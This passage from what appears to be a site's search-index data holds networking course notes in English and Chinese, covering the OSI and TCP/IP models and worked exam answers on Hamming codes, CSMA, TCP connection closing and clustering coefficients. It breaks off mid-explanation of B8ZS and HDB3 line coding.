Overview","text":"Aspect Details Usage Widely used and prevalent, especially for the Internet Development Developed independently of the OSI model Characteristics Fewer layers but captures similar functionalities"},{"location":"cs/network/w1/#tcpip-layer-structure","title":"TCP/IP Layer Structure","text":"Layer Name OSI Equivalent Primary Function Protocols 4 Application Application + Presentation + Session User services and data formatting HTTP, SMTP, FTP, DNS 3 Transport Transport End-to-end process communication TCP, UDP 2 Internet Network Packet delivery across networks IP, ICMP, ARP 1 Network Access Data Link + Physical Physical transmission and local network access Ethernet, WiFi, PPP"},{"location":"cs/network/w1/#layer-mapping-comparison","title":"Layer Mapping Comparison","text":"<pre><code>OSI Model (7 layers)          TCP/IP Model (4 layers)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   7. Application    \u2502       \u2502                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502   4. Application    \u2502\n\u2502   6. Presentation   \u2502  \u2500\u2500\u2500\u25ba \u2502                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u2502                     \u2502\n\u2502   5. Session        \u2502       \u2502                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   4. Transport      \u2502  \u2500\u2500\u2500\u25ba \u2502   3. Transport      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   3. Network        \u2502  \u2500\u2500\u2500\u25ba \u2502   2. Internet       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   2. Data Link      \u2502       \u2502                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524  \u2500\u2500\u2500\u25ba \u2502 1. Network Access   \u2502\n\u2502   1. Physical       \u2502       \u2502                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"cs/network/w1/#osi-vs-tcpip-comparison-and-analysis","title":"OSI vs. TCP/IP: Comparison and Analysis","text":""},{"location":"cs/network/w1/#key-differences-comparison","title":"Key Differences Comparison","text":"Aspect OSI Model TCP/IP Model Number of Layers 7 layers 4 layers Standardization Standardized later (1983) Developed earlier, based on existing protocols Protocol Suite Defined model and protocol suite (less successful) Based on existing, successful protocols (TCP, IP) Complexity More detailed layer separation Simpler, more practical approach Adoption Primarily conceptual/educational Widely implemented in practice"},{"location":"cs/network/w1/#why-tcpip-is-more-prevalent","title":"Why TCP/IP is More Prevalent","text":"Factor Explanation Historical Advantage TCP/IP protocols became popular before OSI adoption Practical Implementation Simpler and more practical for building the Internet Existing Infrastructure Built on proven, working protocols Industry Support Early adoption by major technology companies"},{"location":"cs/network/w1/#current-relevance-and-usage","title":"Current Relevance and Usage","text":"Model Primary Use Advantages OSI Conceptual understanding and education Generic standard, detailed layer separation, good for discussion TCP/IP Practical implementation, Internet infrastructure Proven protocols, simpler structure, real-world deployment"},{"location":"cs/network/w1/#model-selection-guidelines","title":"Model Selection Guidelines","text":"Scenario Recommended Model Reason Network Education OSI More detailed layer separation aids understanding Internet Applications TCP/IP Matches actual Internet implementation Protocol Design Either Depends on level of detail needed Troubleshooting OSI Better fault isolation with more specific layers"},{"location":"cs/network/w1/#alternative-layer-models-merging-and-optimization","title":"Alternative Layer Models: Merging and Optimization","text":""},{"location":"cs/network/w1/#hypothetical-5-layer-model-example","title":"Hypothetical 5-Layer Model Example","text":"<p>Instead of OSI's 7 layers, consider a simplified 5-layer approach:</p> Layer Function Formed by Merging 5 Application Services OSI Application + Presentation + Session 4 Transport OSI Transport (unchanged) 3 Network OSI Network (unchanged) 2 Link OSI Data Link + Physical 1 Physical Medium Alternative: keep separate"},{"location":"cs/network/w1/#layer-merging-analysis","title":"Layer Merging Analysis","text":""},{"location":"cs/network/w1/#common-merge-scenarios","title":"Common Merge Scenarios","text":"Merge Option Layers Combined Reasoning Upper Layer Merge Application + Presentation + Session Similar focus on user services and data representation Lower Layer Merge Physical + Data Link Both handle local link transmission TCP/IP Style Multiple combinations Proven simplification approach"},{"location":"cs/network/w1/#advantages-vs-disadvantages","title":"Advantages vs. Disadvantages","text":"Aspect Merging Layers Keeping Separate Simplicity \u2713 Fewer layers to manage \u2717 More complex structure Efficiency \u2713 Less inter-layer overhead \u2717 More interface traffic Modularity \u2717 Reduced independence \u2713 Clear separation of concerns Fault Isolation \u2717 Harder to pinpoint issues \u2713 Easier troubleshooting Implementation \u2717 More complex single layers \u2713 Simpler individual layers"},{"location":"cs/network/w1/#design-considerations","title":"Design Considerations","text":"Factor Fewer Layers More Layers Best For Simple networks, practical implementation Complex systems, educational purposes Maintenance Easier overall management Better fault isolation Performance Potentially faster More overhead Flexibility Less modular Highly modular"},{"location":"cs/network/w10/","title":"10.0 Exam Samples","text":""},{"location":"cs/network/w10/#10-hamming-distance-and-error-detectioncorrection","title":"1.0 Hamming Distance and Error Detection/Correction","text":"<p>First, we are given three codewords:</p> <ul> <li>C1: <code>0101111</code></li> <li>C2: <code>1010001</code></li> <li>C3: <code>1100010</code></li> </ul> <p>These codewords are used in digital communication to represent information and help detect or correct errors.</p>"},{"location":"cs/network/w10/#a-what-is-the-distance-of-this-code","title":"a. What is the distance of this code?","text":"<p>\ud83c\udfaf Goal: Find the minimum Hamming distance of this code.</p> <ol> <li> <p>What is Hamming Distance?     The Hamming distance between two strings of equal length is the number of positions at which the corresponding symbols are different. Simply put, it's how many bits you need to change to transform one codeword into another.</p> </li> <li> <p>Calculate the pairwise Hamming distances:</p> <ul> <li>d(C1, C2): <code>0101111</code> vs <code>1010001</code></li> </ul> </li> </ol> <pre><code>        C1: 0 1 0 1 1 1 1\n        C2: 1 0 1 0 0 0 1\n            \u2191 \u2191 \u2191 \u2191 \u2191 \u2191   (differing bits)\n        Differing bits: 6  =&gt; d(C1, C2) = 6\n</code></pre> <pre><code>- **d(C1, C3):** `0101111` vs `1100010`\n</code></pre> <pre><code>        C1: 0 1 0 1 1 1 1\n        C3: 1 1 0 0 0 1 0\n            \u2191     \u2191 \u2191   \u2191 (differing bits)\n        Differing bits: 4  =&gt; d(C1, C3) = 4\n</code></pre> <pre><code>- **d(C2, C3):** `1010001` vs `1100010`\n</code></pre> <pre><code>        C2: 1 0 1 0 0 0 1\n        C3: 1 1 0 0 0 1 0\n              \u2191 \u2191     \u2191 \u2191 (differing bits)\n        Differing bits: 4  =&gt; d(C2, C3) = 4\n</code></pre> <ol> <li> <p>Distance of the code (\\(d_{min}\\)):     The distance of the code is the minimum Hamming distance among all pairs of codewords.     In our calculations, the distances are 6, 4, and 4.     So, \\(d_{min} = \\min(6, 4, 4) = 4\\).</p> <p>Answer (i): The distance of this code is 4.</p> </li> </ol>"},{"location":"cs/network/w10/#b-how-many-errors-can-this-code-detectcorrect","title":"b. How many errors can this code detect/correct?","text":"<p>\ud83c\udfaf Goal: Calculate the error detection and correction capabilities based on the minimum Hamming distance \\(d_{min}\\).</p> <ul> <li>We already know \\(d_{min} = 4\\).</li> </ul> <ol> <li> <p>Error Detection Capability (\\(s\\)):     A code can detect up to \\(s\\) errors, where \\(s = d_{min} - 1\\).     \\(s = 4 - 1 = 3\\).     This means the code can detect up to 3 errors. If 1, 2, or 3 errors occur, we will definitely know the data is corrupted.</p> </li> <li> <p>Error Correction Capability (\\(t\\)):     A code can correct up to \\(t\\) errors, where \\(t = \\lfloor \\frac{d_{min} - 1}{2} \\rfloor\\). (\\(\\lfloor x \\rfloor\\) means floor of x, i.e., round down to the nearest integer).     \\(t = \\lfloor \\frac{4 - 1}{2} \\rfloor = \\lfloor \\frac{3}{2} \\rfloor = \\lfloor 1.5 \\rfloor = 1\\).     This means the code can correct up to 1 error. If a 1-bit error occurs, we can not only detect it but also change it back to the correct codeword.</p> <p>Answer (ii): This code can detect up to 3 errors and correct up to 1 error.</p> </li> </ol>"},{"location":"cs/network/w10/#c-you-receive-this-code-0100011-what-can-you-determine","title":"c. You receive this code <code>0100011</code> what can you determine?","text":"<p>\ud83c\udfaf Goal: Analyze the received code R = <code>0100011</code> and determine its status.</p> <ol> <li> <p>Calculate the Hamming distance between the received code R and all original valid codewords:</p> <ul> <li>R: <code>0100011</code></li> <li>C1: <code>0101111</code></li> <li>C2: <code>1010001</code></li> <li>C3: <code>1100010</code></li> </ul> <ul> <li>d(R, C1): <code>0100011</code> vs <code>0101111</code></li> </ul> </li> </ol> <pre><code>        R:  0 1 0 0 0 1 1\n        C1: 0 1 0 1 1 1 1\n                  \u2191 \u2191     (differing bits)\n        Differing bits: 2 =&gt; d(R, C1) = 2\n</code></pre> <pre><code>- **d(R, C2):** `0100011` vs `1010001`\n</code></pre> <pre><code>        R:  0 1 0 0 0 1 1\n        C2: 1 0 1 0 0 0 1\n            \u2191 \u2191 \u2191     \u2191   (differing bits)\n        Differing bits: 4 =&gt; d(R, C2) = 4\n</code></pre> <pre><code>- **d(R, C3):** `0100011` vs `1100010`\n</code></pre> <pre><code>        R:  0 1 0 0 0 1 1\n        C3: 1 1 0 0 0 1 0\n            \u2191             \u2191 (differing bits)\n        Differing bits: 2 =&gt; d(R, C3) = 2\n</code></pre> <ol> <li> <p>Analyze the results:</p> <ul> <li>The received code R (<code>0100011</code>) is not any of the original valid codewords (C1, C2, C3).</li> <li>The distance from R to C1 is 2.</li> <li>The distance from R to C2 is 4.</li> <li>The distance from R to C3 is 2. We know the error correction capability of this code is \\(t=1\\). This means if the received codeword is at a distance of 1 from a valid codeword, we can correct it to that valid codeword. Currently, R is at a distance of 2 from both C1 and C3. This exceeds the 1-bit error correction capability. We cannot definitively correct R to C1 or C3.</li> </ul> <p>We also know the error detection capability is \\(s=3\\).</p> <ul> <li>If the original codeword was C1, then 2 errors occurred (since d(R,C1)=2). Since 2 \u2264 3, this error is detectable.</li> <li>If the original codeword was C3, then 2 errors occurred (since d(R,C3)=2). Since 2 \u2264 3, this error is also detectable.</li> <li>If the original codeword was C2, then 4 errors occurred (since d(R,C2)=4). This is beyond the guaranteed detection capability (3 errors). What you can determine:</li> </ul> <ul> <li>The received code <code>0100011</code> contains errors because it is not one of the valid codewords.</li> <li>The number of errors is at least 2 (the minimum distance to C1 and C3).</li> <li>Since the minimum distance is 2 and the correction capability is 1, this error cannot be uniquely corrected (it's equidistant from C1 and C3).</li> <li>Since the number of errors (at least 2) is less than or equal to the detection capability (3), this error can be detected.</li> </ul> <p>Answer (iii): I can determine that the received code <code>0100011</code> contains errors, there are at least 2 error bits, and this error is detectable but cannot be uniquely corrected.</p> </li> </ol>"},{"location":"cs/network/w10/#d-add-a-new-codeword-that-you-would-still-maintain-the-distance","title":"d. Add a new codeword that you would still maintain the distance.","text":"<p>\ud83c\udfaf Goal: Find a new 7-bit codeword C4 such that its Hamming distance to C1, C2, and C3 is at least \\(d_{min} = 4\\).</p> <ul> <li>Existing codewords:<ul> <li>C1: <code>0101111</code></li> <li>C2: <code>1010001</code></li> <li>C3: <code>1100010</code></li> </ul> </li> <li>Requirement: For the new codeword C4:<ul> <li>d(C4, C1) \u2265 4</li> <li>d(C4, C2) \u2265 4</li> <li>d(C4, C3) \u2265 4</li> </ul> </li> </ul> <p>Attempt to find C4:</p> <p>A simple strategy is to try codewords that are structurally very different, such as the all-zeros <code>0000000</code> or all-ones <code>1111111</code> codeword.</p> <ol> <li> <p>Try C4 = <code>0000000</code> (all-zeros codeword):</p> <ul> <li>d(<code>0000000</code>, C1=<code>0101111</code>) = 5 (number of '1's in C1). \\(5 \\ge 4\\) \ud83d\udc4d</li> <li>d(<code>0000000</code>, C2=<code>1010001</code>) = 4 (number of '1's in C2). \\(4 \\ge 4\\) \ud83d\udc4d</li> <li>d(<code>0000000</code>, C3=<code>1100010</code>) = 4 (number of '1's in C3). \\(4 \\ge 4\\) \ud83d\udc4d Excellent! <code>0000000</code> satisfies all conditions.</li> </ul> </li> <li> <p>(Optional) Try C4 = <code>1111111</code> (all-ones codeword):</p> <ul> <li>d(<code>1111111</code>, C1=<code>0101111</code>) = 2 (number of '0's in C1). \\(2 \\not\\ge 4\\) \ud83d\udc4e     This one doesn't work because its distance to C1 is too small.</li> </ul> </li> </ol> <p>So, <code>0000000</code> is a valid new codeword.</p> <p>Answer (iv): A new codeword that can be added is <code>0000000</code> . The Hamming distance from this codeword to all existing codewords (C1, C2, C3) is at least 4, thus maintaining the original minimum distance of the code.</p>"},{"location":"cs/network/w10/#20-hamming-code","title":"2.0 Hamming Code","text":"A B R 0 0 0 0 1 1 1 0 1 1 1 0 <p>\u4ee5\u4e0a\u4e3a XOR</p> <p>To construct a Hamming code for the data codeword <code>1100010</code> , we'll follow these steps, assuming even parity:</p>"},{"location":"cs/network/w10/#a-determine-the-number-of-data-and-parity-bits","title":"a. Determine the Number of Data and Parity Bits","text":"<ul> <li>Data bits (m): The given data <code>1100010</code> has m=7 bits.</li> <li>Parity bits (p): We need to find the smallest integer p that satisfies the inequality \\(2^p \u2265 m+p+1\\). For m=7:</li> <li>If p=3, \\(2^3=8\\). \\(m+p+1=7+3+1=11\\). Since 8&lt;11, p=3 is not enough.</li> <li>If p=4, \\(2^4=16\\). \\(m+p+1=7+4+1=12\\). Since 16\u226512, we need p=4 parity bits.</li> <li>Total bits (n): The total length of the Hamming codeword will be n=m+p=7+4=11 bits.</li> </ul>"},{"location":"cs/network/w10/#b-position-parity-and-data-bits","title":"b. Position Parity and Data Bits","text":"<p>The parity bits (P) are placed at positions that are powers of 2. The data bits (D) fill the remaining slots. We'll label the input data bits as \\(D_1 D_2 D_3 D_4 D_5 D_6 D_7=1100010\\)</p> <p>The 11-bit codeword structure is:</p> Position 1 2 3 4 5 6 7 8 9 10 11 Type P1 P2 D1 P4 D2 D3 D4 P8 D5 D6 D7 Value P1 P2 1 P4 1 0 0 P8 0 1 0"},{"location":"cs/network/w10/#c-calculate-parity-bits-even-parity","title":"c. Calculate Parity Bits (Even Parity)","text":"<p>Each parity bit checks specific positions in the codeword. For even parity, the parity bit is set to 0 or 1 to make the total number of 1s in the checked positions (including the parity bit itself) even. Equivalently, P=XOR of data bits it checks.</p> <ul> <li>P1 (Position 1): Checks bits 1, 3, 5, 7, 9, 11. Data bits involved: D1, D2, D4, D5, D7 (at positions 3, 5, 7, 9, 11). P1=D1\u2295D2\u2295D4\u2295D5\u2295D7=1\u22951\u22950\u22950\u22950=0</li> <li>P2 (Position 2): Checks bits 2, 3, 6, 7, 10, 11. Data bits involved: D1, D3, D4, D6, D7 (at positions 3, 6, 7, 10, 11). P2=D1\u2295D3\u2295D4\u2295D6\u2295D7=1\u22950\u22950\u22951\u22950=0</li> <li>P4 (Position 4): Checks bits 4, 5, 6, 7. Data bits involved: D2, D3, D4 (at positions 5, 6, 7). P4=D2\u2295D3\u2295D4=1\u22950\u22950=1</li> <li>P8 (Position 8): Checks bits 8, 9, 10, 11. Data bits involved: D5, D6, D7 (at positions 9, 10, 11). P8=D5\u2295D6\u2295D7=0\u22951\u22950=1</li> </ul> \u6821\u9a8c\u4f4d (Parity Bit) \u68c0\u67e5\u7684\u7801\u5b57\u4f4d\u7f6e (Codeword Positions) P1 1, 3, 5, 7, 9, 11 P2 2, 3, 6, 7, 10, 11 P4 4, 5, 6, 7 P8 8, 9, 10, 11"},{"location":"cs/network/w10/#d-construct-the-hamming-codeword","title":"d. Construct the Hamming Codeword","text":"<p>Now, we assemble the parity bits and data bits into the final 11-bit Hamming codeword:</p> Position 1 2 3 4 5 6 7 8 9 10 11 Type P1 P2 D1 P4 D2 D3 D4 P8 D5 D6 D7 Value 0 0 1 1 1 0 0 1 0 1 0 <p>The resulting Hamming codeword for the data <code>1100010</code> is <code>00111001010</code>.</p>"},{"location":"cs/network/w10/#30-can-wireless-be-full-duplex","title":"3.0 Can wireless be full duplex?","text":"<p>Standard wireless networks, such as those using CSMA/CA, operate on a half-duplex shared medium. Simultaneous transmission and reception on a single channel is considered impossible because a device's strong outgoing signal makes it difficult to detect a much weaker incoming signal. This is a key reason wireless networks use collision avoidance (CSMA/CA) rather than collision detection (CSMA/CD).</p> <p>Full-duplex wireless communication is possible through two main approaches:</p> <ul> <li>Multiple Channels: It is possible to achieve full-duplex communication by using separate channels for transmitting and receiving</li> <li>Advanced Techniques: Limited full-duplex communication can be achieved on a single channel using advanced methods like interference cancellation.</li> </ul>"},{"location":"cs/network/w10/#40-what-are-the-benefits-of-using-csmacd-over-csmaca","title":"4.0 What are the benefits of using CSMA/CD over CSMA/CA?","text":"Benefit of CSMA/CD Explanation Faster Collision Handling CSMA/CD offers quick collision detection and recovery. It detects collisions during transmission and stops immediately, then initiates a random backoff. This is a more direct response compared to the avoidance mechanisms of CSMA/CA. No Pre-transmission Overhead CSMA/CA uses control frames like Request to Send/Clear to Send (RTS/CTS) to avoid collisions before transmission begins. CSMA/CD does not have this avoidance overhead, which can make it more efficient in low-contention wired networks. Direct Detection Mechanism The protocol's strategy is to directly detect a collision after it occurs. This is a suitable and efficient approach for wired Ethernet networks where detecting simultaneous transmissions is feasible. CSMA/CD (Collision Detection) CSMA/CA (Collision Avoidance) Pros 1. Fast Recovery: It provides \"quick collision detection and recovery\". It stops transmitting immediately after a collision is detected and then initiates a random backoff period.2. Lower Overhead: In low-contention wired environments, it does not require the overhead of avoidance frames like RTS/CTS, which can lead to higher efficiency. 1. Designed for Wireless: Its avoidance strategy is specifically designed to work in wireless environments where collision detection is difficult.2. More Reliable in its Environment: It uses mechanisms like RTS/CTS control frames to prevent collisions before they happen, which is effective for handling issues like the \"hidden terminal problem\". Cons 1. Not Suitable for Wireless: Its core mechanism, collision detection, is difficult to implement in wireless environments. 2. Performance Degrades with High Collisions: In shared networks (e.g., using hubs with a single collision domain), performance degrades as traffic and the probability of collisions increase. 1. Higher Overhead: The mechanisms used to avoid collisions, including backoff timers and RTS/CTS frames, create additional network overhead that reduces overall efficiency.2. Lower Efficiency: Due to the overhead from collision avoidance, the actual throughput of wireless networks is often significantly lower than the nominal bandwidth."},{"location":"cs/network/w10/#50-describe-scenarios-where-subnet-masking-is-not-needed","title":"5.0 Describe scenarios where subnet masking is not needed.","text":"Scenario Description Classful Networking In a historical classful addressing scheme, a network (Class A, B, or C) is used as a single, large network without further division. The network and host parts are determined by the first few bits of the IP address itself, implying a default mask. Simple Point-to-Point Links When only two hosts are connected directly on a single link, there is no need to divide the network into smaller segments. The primary concern is direct communication between the two endpoints, not managing multiple subnetworks. Single, Flat LAN For a small, isolated Local Area Network (LAN) where all devices are on one segment, subnetting is unnecessary if there's no requirement to separate traffic for security, performance, or broadcast domain management. The entire address block is treated as one uniform network."},{"location":"cs/network/w10/#60-explain-two-different-tcp-closing-scenarios-and-how-they-may-happen","title":"6.0 Explain two different TCP closing scenarios and how they may happen.","text":"Scenario Description How It Happens Graceful Shutdown This is the standard, orderly process for closing a connection. It involves a sequence of FIN (Finish) and ACK (Acknowledge) flags, ensuring both sides of the connection have finished transmitting all their data before the connection is terminated. A typical sequence involves one side sending a FIN, the other acknowledging it, and then sending its own FIN, which is finally acknowledged by the first side. This is the normal way to close a connection and is initiated by an application that has finished transferring data. An example would be when a web browser has fully loaded all assets from a server. Abrupt Reset This is an immediate and forceful termination of the connection. It's accomplished by one side sending a TCP segment with the RST (Reset) flag set. The side that receives the RST packet immediately closes the connection without any further negotiation. This can happen if a host receives a SYN packet for a connection that it doesn't expect or is not working correctly. It can also be triggered by a system timeout, such as when a physical connection is disrupted (e.g., a cable is pulled out), preventing the graceful FIN/ACK sequence from completing."},{"location":"cs/network/w10/#70-clustering-coefficient-for-node-c","title":"7.0 Clustering coefficient for node C?","text":"<p>\u96c6\u805a\u7cfb\u6570\u662f\u7528\u6765\u8861\u91cf\u4e00\u4e2a\u8282\u70b9\u7684\u90bb\u5c45\u8282\u70b9\u4e4b\u95f4\u6709\u591a\u4e48\u201c\u62b1\u56e2\u201d\uff08\u5373\u76f8\u4e92\u8fde\u63a5\uff09\u7684\u7a0b\u5ea6\u3002</p> <p>\u96c6\u805a\u7cfb\u6570\u662f\u7528\u6765\u8861\u91cf\u4e00\u4e2a\u8282\u70b9\u7684\u90bb\u5c45\u8282\u70b9\u4e4b\u95f4\u6709\u591a\u4e48\u201c\u62b1\u56e2\u201d\uff08\u5373\u76f8\u4e92\u8fde\u63a5\uff09\u7684\u7a0b\u5ea6\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u9898\u76ee\u7ed9\u51fa\u7684\u516c\u5f0f\uff1a</p> \\[C_i = \\frac{2e_i}{k_i(k_i - 1)}\\] <ul> <li>\\(C_i\\): \u6211\u4eec\u8981\u8ba1\u7b97\u7684\u8282\u70b9\uff08\u8fd9\u91cc\u662f\u8282\u70b9C\uff09\u7684\u96c6\u805a\u7cfb\u6570\u3002</li> <li>\\(k_i\\): \u8be5\u8282\u70b9\u7684\u5ea6 (degree)\uff0c\u4e5f\u5c31\u662f\u5b83\u6709\u591a\u5c11\u4e2a\u76f4\u63a5\u76f8\u8fde\u7684\u90bb\u5c45\u8282\u70b9\u3002</li> <li>\\(e_i\\): \u5728\u8be5\u8282\u70b9\u7684\u90bb\u5c45\u8282\u70b9\u4e4b\u95f4\uff0c\u5b9e\u9645\u5b58\u5728\u591a\u5c11\u6761\u8fb9\uff08\u8fde\u63a5\uff09\u3002</li> </ul>"},{"location":"cs/network/w10/#a-c","title":"a. \u627e\u51fa\u8282\u70b9C\u7684\u90bb\u5c45\uff0c\u5e76\u8ba1\u7b97\u5176\u201c\u5ea6\u201d","text":"\\[k_C\\] <p>\u6211\u4eec\u5148\u770b\u770b\u56fe\u4e2d\u6709\u54ea\u4e9b\u8282\u70b9\u662f\u76f4\u63a5\u4e0e\u8282\u70b9C\u76f8\u8fde\u7684\uff1a</p> <ul> <li>\u8282\u70b9 A </li> <li>\u8282\u70b9 B </li> <li>\u8282\u70b9 D </li> <li>\u8282\u70b9 H</li> </ul> <p>\u8282\u70b9C\u4e00\u5171\u6709 4 \u4e2a\u90bb\u5c45\u3002\u6240\u4ee5\uff0c\u8282\u70b9C\u7684\"\u5ea6\" \\(k_C = 4\\)\u3002</p>"},{"location":"cs/network/w10/#b-c-e_c","title":"b. \u627e\u51fa\u8282\u70b9C\u7684\u90bb\u5c45\u4e4b\u95f4\u6709\u591a\u5c11\u6761\u8fde\u63a5 (\\(e_C\\))","text":"<p>\u8fd9\u4e00\u6b65\u662f\u5173\u952e\u3002\u6211\u4eec\u9700\u8981\u5728C\u7684\u90bb\u5c45\u96c6\u5408 {A, B, D, H} \u4e2d\uff0c\u5bfb\u627e\u5b83\u4eec\u76f8\u4e92\u4e4b\u95f4\u7684\u8fde\u63a5\u3002</p> <ul> <li>A \u548c B \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6ca1\u6709\u3002</li> <li>A \u548c D \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6ca1\u6709\u3002</li> <li>A \u548c H \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6ca1\u6709\u3002</li> <li>B \u548c D \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6709\u3002</li> <li>B \u548c H \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6ca1\u6709\u3002</li> <li>D \u548c H \u4e4b\u95f4\u6709\u8fde\u63a5\u5417\uff1f \u6709\u3002</li> </ul> <p>\u68c0\u67e5\u5b8c\u6bd5\uff0c\u5728C\u76844\u4e2a\u90bb\u5c45\u4e4b\u95f4\uff0c\u603b\u5171\u6709 2 \u6761\u8fde\u63a5\uff08B-D \u548c D-H\uff09\u3002\u6240\u4ee5\uff0c\u90bb\u5c45\u4e4b\u95f4\u7684\u8fde\u63a5\u6570 </p> <p>\\(e_C = 2\\)\u3002</p>"},{"location":"cs/network/w10/#c","title":"c. \u4ee3\u5165\u516c\u5f0f\u8ba1\u7b97","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u6240\u6709\u9700\u8981\u7684\u503c\uff1a</p> <ul> <li>\\(k_C = 4\\)</li> </ul> <ul> <li>\\(e_C = 2\\)</li> </ul> <p>\u6211\u4eec\u5c06\u8fd9\u4e9b\u503c\u4ee3\u5165\u516c\u5f0f\uff1a</p> <p>\\(C_C = \\frac{2 \\times e_C}{k_C(k_C - 1)}\\)</p> <p>\\(C_C = \\frac{2 \\times 2}{4(4 - 1)}\\)</p> <p>\\(C_C = \\frac{4}{4(3)}\\)</p> <p>\\(C_C = \\frac{4}{12}\\)</p> <p>\\(C_C = \\frac{1}{3}\\)</p> <p>\u6240\u4ee5\uff0c\u8282\u70b9C\u7684\u96c6\u805a\u7cfb\u6570\u662f 1/3 \uff08\u7ea6\u7b49\u4e8e 0.333\uff09\u3002</p>"},{"location":"cs/network/w11/","title":"11.0 Past Exam Questions","text":""},{"location":"cs/network/w11/#2019-final-exam","title":"2019 Final Exam","text":""},{"location":"cs/network/w11/#question-1-physical-layer","title":"Question 1: Physical Layer","text":"<p>Encode the following digital data using both B8ZS and HDB3 (assume an odd number of +/- parity bits observed at the beginning of the given digital data below, and the last voltage we observed was negative).</p> <p><code>000010000000010110000</code></p> <p>Answer:</p> <p>\u597d\u7684\uff0c\u6211\u4eec\u4e00\u6b65\u6b65\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"cs/network/w11/#conceptual-background","title":"Conceptual Background","text":"<ul> <li>AMI (Alternate Mark Inversion)\uff1a</li> <li><code>0</code> \u8868\u793a 0 \u7535\u538b\u3002</li> <li><code>1</code> \u4ea4\u66ff\u8868\u793a\u4e3a +V \u548c -V\u3002</li> </ul> <ul> <li>B8ZS (Bipolar with 8-Zero Substitution)\uff1a</li> <li>\u7528\u4e8e\u5317\u7f8e T1 \u7ebf\u8def\u3002</li> <li>\u51fa\u73b0\u8fde\u7eed 8 \u4e2a 0 \u65f6\uff0c\u8fdb\u884c\u66ff\u6362\u4ee5\u7834\u574f 0 \u5e8f\u5217\uff0c\u540c\u65f6\u5f15\u5165\u6545\u610f\u7684\u201c\u6781\u6027\u8fdd\u89c4\u201d\u3002</li> <li>\u89c4\u5219\uff1a<ul> <li>\u5982\u679c\u524d\u4e00\u4e2a\u975e\u96f6\u8109\u51b2\u662f +V\uff1a<code>00000000</code> \u66ff\u6362\u4e3a <code>000+-0-+</code></li> <li>\u5982\u679c\u524d\u4e00\u4e2a\u975e\u96f6\u8109\u51b2\u662f -V\uff1a<code>00000000</code> \u66ff\u6362\u4e3a <code>000-+0+-</code></li> <li>\u66ff\u6362\u5e8f\u5217\u4e2d\u7684 V (Violation) \u6781\u6027\u4e0e\u524d\u4e00\u4e2a\u8109\u51b2\u76f8\u540c\uff0cB (Bipolar) \u6781\u6027\u4e0e V \u76f8\u53cd\u3002</li> </ul> </li> </ul> <ul> <li>HDB3 (High-Density Bipolar 3-Zero)\uff1a</li> <li>\u7528\u4e8e\u6b27\u6d32 E1 \u7ebf\u8def\u3002</li> <li>\u51fa\u73b0\u8fde\u7eed 4 \u4e2a 0 \u65f6\u8fdb\u884c\u66ff\u6362\u3002</li> <li>\u89c4\u5219\uff1a<ul> <li>\u67e5\u627e\u8fde\u7eed 4 \u4e2a 0 (<code>0000</code>)</li> <li>\u66ff\u6362\u53d6\u51b3\u4e8e\u81ea\u4e0a\u6b21\u66ff\u6362\u4ee5\u6765\u53d1\u9001\u7684\u975e\u96f6\u8109\u51b2\u6570\u91cf\u662f\u5947\u6570\u8fd8\u662f\u5076\u6570\uff0c\u4ee5\u53ca\u524d\u4e00\u4e2a\u975e\u96f6\u8109\u51b2\u7684\u6781\u6027\u3002</li> <li>V (Violation) \u4f4d\uff1a \u6781\u6027\u4e0e\u524d\u4e00\u4e2a\u975e\u96f6\u8109\u51b2\u76f8\u540c\u3002</li> <li>B (Bipolar) \u4f4d\uff1a 